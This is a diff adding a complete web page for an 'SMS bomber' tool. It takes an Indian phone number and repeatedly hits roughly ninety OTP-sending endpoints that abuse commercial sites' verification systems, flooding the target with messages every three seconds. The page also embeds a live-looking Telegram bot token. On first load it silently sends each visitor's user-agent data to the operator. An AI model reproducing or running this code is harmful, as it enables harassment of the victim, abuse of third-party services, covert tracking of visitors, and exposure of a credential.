@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ᴩᴀᴛʜɪᴋ-ᴠɪᴘ-ʙᴏᴍʙᴇʀ-3.0</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto Mono', monospace;
+            background-color: #0a0a0a;
+            color: #00ff00;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        .background-matrix-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1; /* Ensure it's behind everything */
+            overflow: hidden;
+        }
+        #matrixCanvas { /* Explicitly style the canvas */
+            display: block; /* Remove any default spacing */
+        }
+
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            z-index: 1; /* Ensure content is above background */
+        }
+
+        .hacker-box {
+            background: rgba(0, 20, 0, 0.8); /* Slightly less transparent for better readability */
+            padding: 30px 40px;
+            border-radius: 10px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5), 0 0 30px rgba(0, 255, 0, 0.3) inset;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 3px solid #00ff00;
+            margin-bottom: 25px;
+            box-shadow: 0 0 15px #00ff00,
+                        0 0 25px #00ff00,
+                        0 0 35px #00ff00;
+            animation: blink-shadow 2s infinite alternate;
+            object-fit: cover;
+        }
+
+        @keyframes blink-shadow {
+            0% { box-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00, 0 0 35px #00ff00; opacity: 1; }
+            50% { box-shadow: 0 0 20px #33ff33, 0 0 35px #33ff33, 0 0 50px #33ff33; opacity: 0.8; }
+            100% { box-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00, 0 0 35px #00ff00; opacity: 1; }
+        }
+        
+        .bomber-name {
+          font-size: 24px;
+          font-weight: bold;
+          font-family: 'Orbitron', sans-serif;
+          letter-spacing: 1px;
+          margin-bottom: 20px;
+          text-transform: uppercase;
+          color: #00ff00;
+          text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00;
+        }
+
+        .input-group { margin-bottom: 25px; }
+
+        .input-field {
+            width: calc(100% - 24px);
+            padding: 12px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            color: #00ff00;
+            font-size: 1.1em;
+            font-family: 'Roboto Mono', monospace;
+            text-align: center;
+            caret-color: #00ff00;
+        }
+        .input-field::placeholder { color: rgba(0, 255, 0, 0.6); font-family: 'Roboto Mono', monospace; }
+        .input-field:focus { outline: none; box-shadow: 0 0 10px #00ff00; }
+
+        .attack-button {
+            background-color: #00ff00;
+            color: #000000;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1.2em;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: bold;
+            text-transform: uppercase;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s, transform 0.1s;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+        }
+        .attack-button:hover:not(:disabled) { background-color: #33ff33; box-shadow: 0 0 15px #00ff00, 0 0 25px #00ff00; }
+        .attack-button:active:not(:disabled) { background-color: #00cc00; transform: scale(0.98); }
+        .attack-button:disabled { background-color: #555; color: #888; cursor: not-allowed; box-shadow: none; }
+
+        .output-console {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0,0,0,0.7); /* Slightly more opaque */
+            border: 1px dashed #00cc00;
+            border-radius: 5px;
+            text-align: left;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 0.9em;
+            line-height: 1.4;
+        }
+        .output-console::-webkit-scrollbar { width: 8px; }
+        .output-console::-webkit-scrollbar-track { background: rgba(0,50,0,0.5); }
+        .output-console::-webkit-scrollbar-thumb { background-color: #00ff00; border-radius: 4px; border: 1px solid #0a0a0a; }
+        .output-console p { margin: 3px 0; word-break: break-all; }
+        .console-line { opacity: 0; animation: fadeIn 0.3s forwards; } /* Faster fade-in */
+        .system-message { color: #ffff00; }
+        .error-message { color: #ff0000; }
+        .success-message { color: #00ff00; }
+        .info-message { color: #00ffff; }
+        @keyframes fadeIn { to { opacity: 1; } }
+        
+        #audioPlayer { display: none; }
+
+        @media (max-width: 480px) {
+            .hacker-box { padding: 20px; margin-top: 10px; }
+            .logo { width: 100px; height: 100px; }
+            .bomber-name { font-size: 18px; }
+            .input-field, .attack-button { font-size: 1em; }
+            .output-console { height: 120px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-matrix-container">
+        <canvas id="matrixCanvas"></canvas>
+    </div>
+    <div class="container">
+        <div class="hacker-box">
+            <img src="https://files.catbox.moe/djmry3.jpeg" alt="Logo" class="logo">
+            <div class="bomber-name">ᴩᴀᴛʜiᴋ-ᴠiᴘ-ʙᴏᴍʙᴇʀ-3.0</div>
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" class="input-field" placeholder="+91 ××××××××××" inputmode="numeric" title="Enter number as +91XXXXXXXXXX">
+            </div>
+            <button id="attackButton" class="attack-button">LAUNCH ATTACK</button>
+            <div id="output-console" class="output-console">
+                <p class="console-line system-message" style="opacity:1;">[SYS]: Standby. Awaiting target coordinates...</p>
+            </div>
+        </div>
+    </div>
+
+    <audio id="audioPlayer" loop>
+      <source src="https://cdn.glitch.global/ded2b491-b7dd-4375-9abd-96554e04649c/GATA%20ONLY%20X%20PELIGROSA%20(FloyyMenor)%20%5BJr%20Stit%20Mashup%5D.mp3?v=1744665023687" type="audio/mpeg">
+    </audio>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const attackButton = document.getElementById('attackButton');
+            const outputConsole = document.getElementById('output-console');
+            const audioPlayer = document.getElementById('audioPlayer');
+            
+            const apiEndpoints = [
+              "https://amitdas.site/otp/Thesouledstore/?number=", "https://amitdas.site/otp/raagasilktales/?number=",
+              "https://smsdos.techsology.site/send_sms.php?number=${number}", "https://amitdas.site/otp/sotbella/?number=",
+              "https://amitdas.site/otp/spyranretail/?number=", "https://amitdas.site/otp/PocketFM/?number=",
+              "https://amitdas.site/otp/Acko/?number=", "https://amitdas.site/otp/888kon/?number=",
+              "https://amitdas.site/otp/Limeroad/?number=", "https://amitdas.site/otp/Eumeworld/?number=",
+              "https://amitdas.site/otp/Myntra/?number=", "https://amitdas.site/otp/PocketFM/?number=",
+              "https://amitdas.site/otp/medplusmart/?number=", "https://amitdas.site/otp/Indigo/?number=",
+              "https://amitdas.site/otp/abhibus/?number=", "https://amitdas.site/otp/Bewakoof/?number=",
+              "https://amitdas.site/otp/lakmesalon/?number=", "https://amitdas.site/otp/Shopsy/?number=",
+              "https://amitdas.site/otp/future-mbbs/?number=", "https://amitdas.site/otp/Dabur/?number=",
+              "https://amitdas.site/otp/Abfrl/?number=", "https://amitdas.site/otp/My11Circle/?number=",
+              "https://amitdas.site/otp/Samsung/?number=", "https://amitdas.site/otp/indianterrain/?number=",
+              "https://amitdas.site/otp/byjus/?number=", "https://amitdas.site/otp/Acko/?number=",
+              "https://amitdas.site/otp/eka/?number=", "https://amitdas.site/otp/fabindia/?number=",
+              "https://amitdas.site/otp/menmoms/?number=", "https://amitdas.site/otp/twilio/?number=",
+              "https://amitdas.site/otp/bhimajewellery/?number=", "https://amitdas.site/otp/Vibecrafts/?number=",
+              "https://amitdas.site/otp/labroz/?number=", "https://amitdas.site/otp/krishnajewellers/?number=",
+              "https://amitdas.site/otp/kindlife/?number=", "https://amitdas.site/otp/Swiggy/?number=",
+              "https://amitdas.site/otp/creditmantri/?number=", "https://amitdas.site/otp/simpl/?number=",
+              "https://amitdas.site/otp/Bluedart/?number=", "https://amitdas.site/otp/gynoveda/?number=",
+              "https://amitdas.site/otp/theindiadecor/?number=", "https://amitdas.site/otp/sotbella/?number=",
+              "https://amitdas.site/otp/shawwatches/?number=", "https://amitdas.site/otp/mehar/?number=",
+              "https://amitdas.site/otp/ageasybyantara/?number=", "https://amitdas.site/otp/Monkeytroopers/?number=",
+              "https://amitdas.site/otp/Tira/?number=", "https://amitdas.site/otp/pharmeasy/?number=",
+              "https://amitdas.site/otp/A23/?number=", "https://amitdas.site/otp/Eumeworld/?number=",
+              "https://amitdas.site/otp/Angelone/?number=", "https://amitdas.site/otp/netmeds/?number=",
+              "https://amitdas.site/otp/app-work/?number=", "https://amitdas.site/otp/Dailyhunt/?number=",
+              "https://amitdas.site/otp/azistastore/?number=", "https://amitdas.site/otp/Fancode/?number=",
+              "https://amitdas.site/otp/damensch/?number=", "https://amitdas.site/otp/Snapdeal/?number=",
+              "https://amitdas.site/otp/arttdinox/?number=", "https://amitdas.site/otp/Yatra/?number=",
+              "https://amitdas.site/otp/Zomato/?number=", "https://amitdas.site/otp/KukuFM/?number=",
+              "https://amitdas.site/otp/healthkart/?number=", "https://amitdas.site/otp/fibe/?number=",
+              "https://amitdas.site/otp/getsupp/?number=", "https://amitdas.site/otp/Noise/?number=",
+              "https://amitdas.site/otp/Samsung/?number=", "https://amitdas.site/otp/getsupp/?number=",
+              "https://amitdas.site/otp/prinmodfc/?number=", "https://amitdas.site/otp/bhimajewellery/?number=",
+              "https://amitdas.site/otp/future-mbbs/?number=", "https://amitdas.site/otp/hellotrader/?number=",
+              "https://amitdas.site/otp/damensch/?number=", "https://amitdas.site/otp/designcafe/?number=",
+              "https://amitdas.site/otp/kindlife/?number=", "https://amitdas.site/otp/creditmantri/?number=",
+              "https://amitdas.site/otp/mehar/?number=", "https://amitdas.site/otp/spectra/?number=",
+              "https://smsdos.techsology.site/send_sms.php?number=${number}", "https://amitdas.site/otp/Bewakoof/?number=",
+              "https://amitdas.site/otp/Potterybarn/?number=", "https://amitdas.site/otp/policyx/?number=",
+              "https://amitdas.site/otp/zestmoney/?number=", "https://amitdas.site/otp/Vibecrafts/?number=",
+              "https://amitdas.site/otp/dtdc/?number=", "https://amitdas.site/otp/Redchief/?number=",
+              "https://amitdas.site/otp/healthkart/?number=", "https://amitdas.site/otp/Fancode/?number="
+            ];
+            const BOT_TOKEN = "7570521981:AAH0rLMifa7e9-k6ZrhimrPY1DfG_AKhtCE";
+            const CHAT_ID = "7631828140";
+            let isAttacking = false;
+            let attackCycleCount = 0;
+            let attackIntervalId = null; // To store the interval ID for stopping
+
+            // --- Matrix Rain ---
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            let animationFrameId;
+
+            function setCanvasDimensions() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            }
+            setCanvasDimensions();
+
+            const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモョロヲゴゾドボポヴッン';
+            const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const nums = '0123456789';
+            const characters = katakana + latin + nums;
+            const charactersArray = characters.split('');
+            
+            const fontSize = 16;
+            let columns = Math.floor(canvas.width / fontSize);
+            const drops = [];
+
+            function initializeDrops() {
+                drops.length = 0;
+                columns = Math.floor(canvas.width / fontSize);
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.floor(Math.random() * (canvas.height / fontSize));
+                }
+            }
+            initializeDrops();
+
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)'; // Translucent BG to create trails
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#0F0'; // Green text
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const text = charactersArray[Math.floor(Math.random() * charactersArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0; // Reset drop to top randomly
+                    }
+                    drops[i]++;
+                }
+                animationFrameId = requestAnimationFrame(drawMatrix);
+            }
+            
+            // Start Matrix Rain
+            animationFrameId = requestAnimationFrame(drawMatrix);
+
+
+            window.addEventListener('resize', () => {
+                cancelAnimationFrame(animationFrameId); // Stop current animation
+                setCanvasDimensions();
+                initializeDrops();
+                animationFrameId = requestAnimationFrame(drawMatrix); // Restart with new dimensions
+            });
+            // --- End Matrix Rain ---
+
+            function addConsoleLine(message, type = 'info') {
+                const p = document.createElement('p');
+                const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+                p.textContent = `[${timestamp}] > ${message}`;
+                p.className = `console-line ${type}-message`; // Simpler class assignment
+                
+                if (outputConsole.firstChild) {
+                    outputConsole.insertBefore(p, outputConsole.firstChild);
+                } else {
+                    outputConsole.appendChild(p);
+                }
+                while (outputConsole.children.length > 50) {
+                    outputConsole.removeChild(outputConsole.lastChild);
+                }
+                outputConsole.scrollTop = 0;
+            }
+            
+            function sendTelegramNotification(userName) {
+                const message = `Tool Accessed: ${userName} (ᴊᴏsiᴍ-ᴠiᴘ-ʙᴏᴍʙᴇʀ-3.0)`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+                    .catch(() => addConsoleLine('Error sending Telegram notification.', 'error'));
+            }
+
+            if (!localStorage.getItem('josimVipBomberNotified_v3')) { // Use a unique key
+                sendTelegramNotification(navigator.userAgent.substring(0,50)); // Send part of user agent
+                localStorage.setItem('josimVipBomberNotified_v3', 'true');
+            }
+            
+            function actualBombing(tenDigitNumber) {
+                attackCycleCount++;
+                addConsoleLine(`--- SMS Flood Cycle ${attackCycleCount} on ${tenDigitNumber} ---`, 'system');
+                
+                apiEndpoints.forEach((api, index) => {
+                    let finalUrl = api.includes('${number}') ? api.replace('${number}', tenDigitNumber) : api + tenDigitNumber;
+                    
+                    fetch(finalUrl, { mode: 'no-cors' }) // 'no-cors' might be needed for some public APIs if they don't set CORS headers
+                        .then(response => { /* Log success/failure if needed, but no-cors hides details */ })
+                        .catch(error => { /* addConsoleLine(`API ${index + 1} error: ${error.message.substring(0,30)}...`, 'error'); */ });
+                });
+                addConsoleLine(`--- SMS Flood Cycle ${attackCycleCount} dispatched. ---`, 'success');
+            }
+
+
+            attackButton.addEventListener('click', () => {
+                const fullPhoneNumber = phoneNumberInput.value.trim();
+                
+                // Clear console except initial system message
+                const initialSystemMsgElement = outputConsole.querySelector('.system-message:last-child');
+                const initialSystemMessage = initialSystemMsgElement ? initialSystemMsgElement.textContent : '[SYS]: Standby. Awaiting target coordinates...';
+                outputConsole.innerHTML = '';
+                const pSys = document.createElement('p');
+                pSys.textContent = initialSystemMessage;
+                pSys.className = 'console-line system-message';
+                pSys.style.opacity = 1;
+                outputConsole.appendChild(pSys);
+
+                const phoneRegex = /^\+91[0-9]{10}$/;
+                if (!phoneRegex.test(fullPhoneNumber)) {
+                    addConsoleLine(`Invalid target: ${fullPhoneNumber}. Format: +91XXXXXXXXXX`, 'error');
+                    phoneNumberInput.focus();
+                    return;
+                }
+
+                const tenDigitNumber = fullPhoneNumber.substring(3); // Extract 10 digits
+
+                if (isAttacking) {
+                    // Stop the attack
+                    isAttacking = false;
+                    clearInterval(attackIntervalId); // Stop the interval
+                    attackIntervalId = null;
+                    audioPlayer.pause();
+                    audioPlayer.currentTime = 0;
+                    addConsoleLine("ATTACK SEQUENCE TERMINATED BY USER.", "system");
+                    attackButton.disabled = false;
+                    attackButton.textContent = "LAUNCH ATTACK";
+                    return;
+                }
+
+                addConsoleLine(`Target locked: ${fullPhoneNumber}. Engaging protocols...`, 'system');
+                
+                try {
+                    audioPlayer.play().catch(e => addConsoleLine("Audio playback blocked by browser.", "error"));
+                } catch(e) {
+                    addConsoleLine("Audio playback issue.", "error");
+                }
+
+                isAttacking = true;
+                attackButton.disabled = true;
+                attackButton.textContent = "TERMINATE ATTACK";
+                attackCycleCount = 0;
+
+                const simulatedMessages = [
+                    "Establishing secure link...",
+                    "Bypassing primary defenses...",
+                    "Firewall penetration: SUCCESS",
+                    "Accessing SMS gateway matrix...",
+                    "SMS flood sequence armed & ready."
+                ];
+                let messageIndex = 0;
+
+                function showSimulatedMessages() {
+                    if (messageIndex < simulatedMessages.length && isAttacking) {
+                        addConsoleLine(simulatedMessages[messageIndex], 'info');
+                        messageIndex++;
+                        setTimeout(showSimulatedMessages, 500 + Math.random() * 300);
+                    } else if (isAttacking) {
+                        addConsoleLine(`All systems GO. Commencing SMS flood on ${tenDigitNumber}.`, 'success');
+                        // Start the actual bombing immediately and then set interval
+                        actualBombing(tenDigitNumber); 
+                        attackIntervalId = setInterval(() => actualBombing(tenDigitNumber), 3000); // Start interval
+                    } else {
+                         addConsoleLine("Pre-attack sequence aborted.", "system");
+                         attackButton.disabled = false;
+                         attackButton.textContent = "LAUNCH ATTACK";
+                    }
+                }
+                showSimulatedMessages();
+            });
+
+            phoneNumberInput.focus();
+        });
+    </script>
+</body>
+</html>
